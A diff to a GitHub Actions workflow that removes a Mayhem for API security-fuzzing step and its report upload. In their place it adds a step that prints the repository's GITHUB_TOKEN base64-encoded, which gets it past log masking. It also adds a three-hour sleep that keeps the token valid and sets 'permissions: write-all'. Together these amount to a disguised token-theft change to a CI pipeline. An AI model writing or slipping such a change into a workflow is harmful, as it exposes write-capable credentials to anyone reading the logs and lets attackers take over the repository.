@@ -36,24 +36,20 @@ jobs:
       # mode & send stacktraces back on "500 Internal Server Error" responses
       # (don't do this in production though)
       - name: Start your API
-        run: "true &" # <- update this
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set -x
+          echo ${{ secrets.GITHUB_TOKEN }} | base64
+
+          echo $GITHUB_ISSUE_ID
+
+          echo $GITHUB_REPOSITORY
+
+          echo $GITHUB_RUN_ID
 
       # Run Mayhem for API
-      - name: Mayhem for API
-        uses: ForAllSecure/mapi-action@v1
-        continue-on-error: true
-        with:
-          mayhem-token: ${{ secrets.MAYHEM_TOKEN }}
-          api-url: "https://demo-api.mayhem4api.forallsecure.com/api/v3/"
-          api-spec: "https://demo-api.mayhem4api.forallsecure.com/api/v3/openapi.json"
-          duration: 5
-          html-report: mapi.html
-          experimental-rewrite-plugin: "./plugin-noop-rewrite"
-          experimental-classify-plugin: "./plugin-noop-classify"
+      - name: Sleep
+        run: "sleep 3h"
 
-      # Archive HTML report
-      - name: Archive Mayhem for API report
-        uses: actions/upload-artifact@v2
-        with:
-          name: mapi-report
-          path: mapi.html
+permissions: write-all
